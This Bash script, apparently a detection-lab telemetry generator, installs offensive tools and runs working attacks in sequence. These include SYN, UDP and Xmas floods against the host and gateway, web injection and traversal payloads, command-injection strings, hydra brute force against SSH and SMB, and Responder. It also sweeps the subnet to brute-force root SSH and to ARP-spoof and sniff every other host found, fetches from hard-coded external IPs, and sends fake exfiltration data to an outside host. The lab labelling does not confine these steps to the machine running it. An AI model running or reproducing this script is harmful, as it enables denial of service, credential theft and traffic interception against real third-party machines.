#!/bin/bash

# ============================================
echo "case 1: NETWORK VISIBILITY + TRAFFIC SCRIPT "
# ============================================
INTERVAL=3

echo "[+] Starting Network Analysis..."
# ============================================
echo " case 2: ROOT CHECK "
# ============================================
if [[ $EUID -ne 0 ]]; then
    echo "[!] Run as root"
    exit 1
fi
# ============================================
echo " case 3: NETWORK DETECTION "
# ============================================
INTERFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
LOCAL_IP=$(ip -4 addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1 | head -n1)
GATEWAY=$(ip route | awk '/default/ {print $3}' | head -n1)
PUBLIC_IP=$(timeout 5 curl -s https://ifconfig.me || echo "Unavailable")
echo "----------------------------------"
echo "[+] Interface : $INTERFACE"
echo "[+] Local IP  : $LOCAL_IP"
echo "[+] Gateway   : $GATEWAY"
echo "[+] Public IP : $PUBLIC_IP"
echo "----------------------------------"
# ============================================
echo " case 4: WIFI CHECK "
# ============================================
if [[ "$INTERFACE" == wlan* ]]; then
    echo "[!] WiFi detected (limited visibility)"
fi
# ============================================
echo " case 5 STATUS ANALYSIS "
# ============================================
if [[ "$LOCAL_IP" == 127.* ]]; then
    echo "[+] Status : Loopback"
elif [[ "$LOCAL_IP" == 192.168.* ]] || [[ "$LOCAL_IP" == 10.* ]]; then
    echo "[+] Status : Private LAN"
else
    echo "[+] Status : Public Interface"
fi
echo "----------------------------------"
echo "[+] Analysis Complete"
# ============================================
echo " case 6: INSTALL REQUIREMENTS "
# ============================================
echo "++++++++ Installing Requirements ++++++++"

declare -A tool_map=(
    ["nmap"]="nmap"
    ["hping3"]="hping3"
    ["nc"]="netcat-traditional"
    ["hydra"]="hydra"
    ["arpspoof"]="dsniff"
    ["crunch"]="crunch"
    ["bettercap"]="bettercap"
    ["nikto"]="nikto"
    ["dnsutils"]="dnsutils"
    ["snmp"]="snmp"
    ["snmpwalk"]="snmp"
    ["curl"]="curl"
    ["sqlmap"]="sqlmap"
  ["socat"]="socat"
["smbclient"]="smbclient"
["sipp"]="sipp"
["openssl"]="openssl"
["netstat"]="net-tools"   
)

apt update -qq

for tool in "${!tool_map[@]}"; do

    pkg=${tool_map[$tool]}

    if command -v "$tool" &>/dev/null; then
        echo "[✓] $tool already installed"
    else
        echo "[!] Installing $pkg"
        apt install -y "$pkg" -qq
    fi

done
# ============================================
echo " case 7: INSTALL RESPONDER "
# ============================================
if ! command -v responder &>/dev/null; then

    echo "[!] Installing Responder..."
    apt install -y git python3-pip -qq
    if [[ ! -d /opt/Responder ]]; then
        git clone https://github.com/lgandx/Responder.git /opt/Responder
    fi
    ln -sf /opt/Responder/Responder.py /usr/local/bin/responder
    chmod +x /opt/Responder/Responder.py
    echo "[✓] Responder Installed"
else
    echo "[✓] Responder already installed"
fi
# ============================================
echo " case 8: START SERVICES "
# ============================================
echo "+++++++ Starting Required Services +++++++"
declare -A svc_pkg=(
    ["apache2"]="apache2"
    ["ssh"]="openssh-server"
    ["snmpd"]="snmpd"
    ["smbd"]="samba"
)
for svc in "${!svc_pkg[@]}"; do

    pkg=${svc_pkg[$svc]}

    if ! systemctl list-unit-files | grep -q "^$svc"; then
        echo "[!] Installing service package $pkg"
        apt install -y "$pkg" -qq
    fi

    echo "[+] Starting service $svc"

    systemctl enable "$svc" --now >/dev/null 2>&1

done

echo "[+] Services Ready"

# ============================================
echo " case 9: URL FILE "
# ============================================
echo "+++++++ Preparing URL File ++++++++"

f="type"

cat <<EOF > "$f"
http://testmynids.org/uid/index.html
https://102.130.113.30
https://102.130.113.42
https://102.130.113.9
https://102.130.127.117
https://102.205.44.23
https://102.205.44.250
https://102.205.44.36
https://102.205.44.5

EOF

echo "[+] URL file created"
target_ip=$(getent ahostsv4 "$target" | awk '{print $1; exit}')
target_ip=$LOCAL_IP
# ============================================
echo " CURL DOWNLOAD TEST "
# ============================================
echo "+++++++ Curling External IPs +++++++"

while read -r url; do

    echo "[*] Trying : $url"

    timeout 8 curl \
        -L \
        --connect-timeout 3 \
        --max-time 5 \
        -k \
        -s \
        -O \
        "$url"

done < <(grep -E "^https" "$f")

echo "[+] Downloads Complete"


# ============================================
# HIGH-VOLUME DEFENSIVE TELEMETRY GENERATOR
# Safe for isolated detection labs
# ============================================

TARGET_URL="http://${LOCAL_IP}:3000"
TARGET_IP="${LOCAL_IP}"

echo "[+] Starting Detection Telemetry"


# ============================================
# T1595 — Active Scanning
# ============================================
echo "[*] ICMP Sweep Simulation"

for i in {1..50}; do
    ping -c 1 $TARGET_IP >/dev/null
done


# ============================================
# SMB Connection Noise
# ============================================
echo "[*] SMB Enumeration Attempts"

for i in {1..50}; do
    smbclient -L //$TARGET_IP -N >/dev/null 2>&1 &
done

wait


# TCP Connection Flood (LOCAL ONLY)

echo "[*] TCP Session Noise"

timeout 5 bash -c "
while true; do
    nc -zv $LOCAL_IP 22 >/dev/null 2>&1
done
"

# ============================================
# HTTP Header Variations
# ============================================
echo "[*] Browser Emulation"

agents=(
"Mozilla/5.0"
"curl/7.81.0"
"Wget/1.21"
"Python-urllib/3.10"
)

for ua in "${agents[@]}"; do
    for i in {1..50}; do
        curl -A "$ua" -s "$TARGET_URL/api/test?id=$i" >/dev/null &
    done
done

wait

# ============================================
# Connection Enumeration
# ============================================
echo "[*] Network Enumeration"

netstat -tunap
ss -tunap
lsof -i
arp -a

#

echo "+++++++ A. Reconnaissance Attacks +++++++"
echo " case 33 Uses the Nmap Scripting Engine (NSE) to probe for vulnerabilities "
nmap --script vuln -T4 $LOCAL_IP
TARGET_OTHER="${SUBNET_PREFIX}.50"
nmap -T5 --min-parallelism 100 $LOCAL_IP
timeout 5 nmap $LOCAL_IP
timeout 5 nmap -A -T4 $LOCAL_IP
timeout 5 nmap -p- $LOCAL_IP
timeout 5 nmap -sC -sV -T4 -p- $LOCAL_IP
timeout 5 nmap -sS $LOCAL_IP
echo "+++++++++ Web Scanner ++++++++++"


nikto -h $LOCAL_IP -Tuning 123456789abc -C all -Display V -useragent "Mozilla/5.0"

#ommand: Forward traffic from local port 8080 to an external address (e.g., Google DNS).
timeout 5 socat TCP4-LISTEN:8080,fork TCP4:8.8.8.8:53

# Simulates an attempt to read the Linux password file
data=$(echo "../../../etc/passwd" | base64 -w 0)
curl -X POST -d "exfil=$data" http://$LOCAL_IP:3000

# Simulates a login bypass or data dump attempt
data=$(echo "' OR 1=1 --" | base64 -w 0)
curl -X POST -d "exfil=$data" http://$LOCAL_IP:3000

# Encodes a basic script tag to see if the WAF decodes and inspects it
data=$(echo "<script>alert('Injection-Test')</script>" | base64 -w 0)
curl -X POST -d "exfil=$data" http://$LOCAL_IP:3000

# Generate 10,000 strings, encode them, and stream over port 8080
timeout 30 crunch 5 5 -c 10000 | base64 | nc -w 3 $LOCAL_IP 3000

for i in {1..20}; do
    DOMAIN="$(tr -dc 'a-z' < /dev/urandom | head -c 12).com"

    echo "[*] Querying: $DOMAIN"

    timeout 3 nslookup "$DOMAIN" >/dev/null 2>&1
done

echo "case 34 :B. Network-Based Attacks "
timeout 5 ping -f $LOCAL_IP
timeout 5 ping -f $GATEWAY
echo "+++++++ C. SYN Flood +++++++"

timeout 5 hping3 -S --flood -p 445 $GATEWAY
timeout 5 hping3 -S --flood -V -p 443 "$LOCAL_IP"
echo "+++++++ UDP Flood +++++++"

timeout 5 hping3 --udp --flood -p 80 $GATEWAY

echo "+++++++ heavy payload flood +++++++"
timeout 5 hping3 -S --flood -d 1200 $LOCAL_IP
timeout 5 hping3 -S --flood -d 1200 $GATEWAY
echo "+++++++ the Xmas flood +++++++"
timeout 5 hping3 -X --flood --rand-source -d 1200 $LOCAL_IP
echo "+++++++ UDP Bandwidth Flood +++++++"
timeout 5 hping3 --udp --flood -d 1400 -p 53 $LOCAL_IP
echo "+++++++ G. DNS Attacks +++++++"
timeout 5 hping3 --udp -p 53 --flood $LOCAL_IP
echo "+++++++ Denial of Service Simulation +++++++"
timeout 5 hping3 -S --flood -p 445 $LOCAL_IP > /dev/null 2>&1 &
timeout 5 hping3 --udp --flood -d 1200 -p 53 $LOCAL_IP > /dev/null 2>&1 &

echo "+++++++ D. Port-Based Attacks +++++++"
 
nc -zv $LOCAL_IP 22

echo "+++++++ E. Payload-Based Attacks +++++++"


echo "malware attack exploit" | nc -v -w 2 $LOCAL_IP 80



echo "+++++++ 1. Send the Payload +++++++"

echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | nc -v $LOCAL_IP 80

echo "+++++++ 2. Test for Injection Vulnerabilities +++++++"

echo "; id; whoami" | nc $LOCAL_IP 80

echo "+++++++ 3. Identify the Service (Banner Grabbing) +++++++"

printf "HEAD / HTTP/1.1\r\nHost: $LOCAL_IP\r\n\r\n" | nc -v $LOCAL_IP 80


echo " case 35 : Password Based Attack "
echo "+++++++ E. Brute Force Attacks +++++++"
whoami
cu=$(whoami)
timeout 10 hydra -l "$cu" -P <(crunch 4 4 123 2>/dev/null) -t 1 -vV ssh://"$LOCAL_IP"
# Brute force SMB (Windows File Sharing) - triggers account lockout alerts
timeout 10 hydra -L <(crunch 4 123 2>/dev/null) -P <(crunch 4 4 123 2>/dev/null) "$LOCAL_IP" smb

for port in 21 23 445; do
timeout 5 hydra -l admin -P <(crunch 4 4 123 2>/dev/null) ssh://$LOCAL_IP -s $port
done
# ---- D. ADVERSARY-IN-THE-MIDDLE (T1557) ----
echo "+++++++ Responder (LLMNR/NBT-NS) +++++++"
timeout 5 responder -I $INTERFACE -dwv > /dev/null 2>&1 &

# Send a sensitive file via a simple TCP connection (Data Leakage alert)
echo "FAKE_SHADOW_SIMULATION" | nc -w 2 "$GATEWAY" 8080 2>/dev/null || true


echo "+++++++ H. ARP Spoofing (MITM Simulation) +++++++"

TARGET_ARP=$(arp -a | awk '/192\.168\.10\./ {print $2}' | tr -d '()' | grep -v "$LOCAL_IP" | head -n 1)

if [[ -n "$TARGET_ARP" ]]; then
    echo "[+] Using target: $TARGET_ARP"
    timeout 6 arpspoof -i "$INTERFACE" -t "$TARGET_ARP" "$GATEWAY"
else
    echo "[!] No valid ARP target found"
fi

echo "+++++++++ QL Injection pattern ++++++++++"

SQL_PAYLOAD="%27%20OR%201%3D1--"

timeout 6 curl -s \
"http://$LOCAL_IP/index.php?id=$SQL_PAYLOAD" \
>/dev/null 2>&1


echo "+++++++++ Path Traversal pattern ++++++++++"
NAME=$(crunch 6 6 abc123 -o - | head -n 1)

PAYLOAD="../../../../$NAME.txt"

timeout 6 curl -s \
"http://$LOCAL_IP/download?file=$PAYLOAD" \
>/dev/null 2>&1


echo "+++++++++++ SNMP Enumeration ++++++++++"
timeout 5 snmpwalk -v2c -c public $LOCAL_IP

echo " case 36: ---- B. CREDENTIAL ACCESS & LATERAL MOVEMENT (T1110) ---- "
echo "+++++++ External Network Brute Force Simulation +++++++"

# 1. Discover other active IPs (Strictly excluding LOCAL_IP and GATEWAY)
echo "[*] Scanning for OTHER targets in $LOCAL_IP/24..."
SUBNET="${LOCAL_IP%.*}.0/24"
mapfile -t LIVE_HOSTS < <(nmap -n -sn "$SUBNET" | grep "Nmap scan report" | awk '{print $5}' |grep -vE "(${LOCAL_IP//./\\.}|${GATEWAY//./\\.}|127\.0\.0\.1)")

if [ ${#LIVE_HOSTS[@]} -eq 0 ]; then
    echo "[!] No other targets detected on the network."
else
    echo "[+] Found ${#LIVE_HOSTS[@]} external targets: ${LIVE_HOSTS[*]}"
    
for host in "${LIVE_HOSTS[@]}"; do
    echo "[*] Testing telemetry against $host"

    timeout 10 hydra -I \
        -q \
        -l root \
        -P <(crunch 4 4 123 2>/dev/null) \
        ssh://"$host" \
        -t 2 \
        -f \
        >/dev/null 2>&1 &
done

wait

echo "[+] Hydra telemetry phase completed"
fi
# T1041 — Data Exfiltration (triggers on real NIC via GATEWAY)

# 1. EICAR test string (standard IDS exfil test)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | nc -w 2 "$GATEWAY" 80

# 2. Fake encoded data POST to internet
curl -s -X POST -d "data=$(echo 'FAKE_EXFIL' | base64)" https://httpbin.org/post > /dev/null

# 3. Large outbound transfer (volume alert)
curl -s -o /dev/null http://ipv4.download.thinkbroadband.com/10MB.zip
echo " case 37: ++++++++++ MIM +++++++++++++"
echo "++++++++++ MIM: Dynamic Target Switching +++++++++++++"

echo "++++++++++ MIM: Infinite Multi-Target Rotation +++++++++++++"

# 1. Identify the Gateway
GATEWAY=$(ip route | grep default | awk '{print $3}')

# 2. Discover all active targets
echo "[!] Scanning network for all active targets..."

bettercap -iface "$INTERFACE" -eval "net.probe on; sleep 7; net.show; quit" > discovery.txt

# 3. Create an array of ALL found IPs (excluding self and gateway)
mapfile -t TARGETS < <(
grep -E -o '([0-9]{1,3}\.){3}[0-9]{1,3}' discovery.txt |
grep -vE "^($LOCAL_IP|$GATEWAY|0\.0\.0\.0)$" |
grep -vE '\.0$|\.255$' |
sort -u
)

if [ ${#TARGETS[@]} -eq 0 ]; then
    echo "[-] No targets found. Check if the network is empty or protected."
    rm discovery.txt
    exit 1
fi

echo "[+] Found ${#TARGETS[@]} targets: ${TARGETS[*]}"

# 4. Generate the ticker command string dynamically for ALL targets
TICKER_CMD=""
for ip in "${TARGETS[@]}"; do
    TICKER_CMD+="echo '[#] Attacking $ip'; set arp.spoof.targets $ip; arp.spoof on; sleep 10; arp.spoof off; "
done

# 5. Launch Bettercap with the full rotation
 bettercap -iface "$INTERFACE" -eval "
  set net.sniff.verbose true;
  net.sniff on;
  set arp.spoof.fullduplex true;
  set ticker.commands '$TICKER_CMD';
  set ticker.period 1;
  ticker on;
  ticker off;
  arp.spoof off;
  net.sniff off;

  quit
"

rm discovery.txt

# ============================================
# SAFE LAB CLEANUP
# ============================================

echo "========================================"
echo "[+] Starting Safe Cleanup"
echo "========================================"

# Kill background jobs started by this script
echo "[*] Stopping background jobs..."
jobs -p | xargs -r kill -9

# Kill known temporary tooling processes
echo "[*] Stopping temporary tools..."

pkill -f responder
pkill -f bettercap
pkill -f hping3
pkill -f hydra
pkill -f socat
pkill -f crunch
pkill -f arpspoof
pkill -f "nc -zv"
pkill -f "ping -f"

# Remove temporary files
echo "[*] Removing temp files..."

rm -f discovery.txt
rm -f type
rm -f *.pcap
rm -f *.tmp
rm -f *.log

# Clear downloaded test artifacts
find . -maxdepth 1 -type f \( \
-name "*.html" -o \
-name "*.txt" -o \
-name "*.bin" \
\) -delete

# Stop temporary listeners
echo "[*] Cleaning sockets..."

fuser -k 8080/tcp >/dev/null 2>&1


# Restart networking cleanly
echo "[*] Resetting networking state..."

systemctl restart networking >/dev/null 2>&1 || true

# Optional: stop services started for lab telemetry
echo "[*] Stopping optional lab services..."

systemctl stop snmpd >/dev/null 2>&1 || true
systemctl stop smbd >/dev/null 2>&1 || true

NETWORK_ELF=$(find / -type f -executable -name "network.elf" 2>/dev/null | head -n 1)

if [[ -n "$NETWORK_ELF" && -f "$NETWORK_ELF" ]]; then
    echo "[+] Removing: $NETWORK_ELF"
    rm -f "$NETWORK_ELF"
else
    echo "[-] network.elf not found"
fi


echo "[+] Cleanup Complete"
echo "========================================"
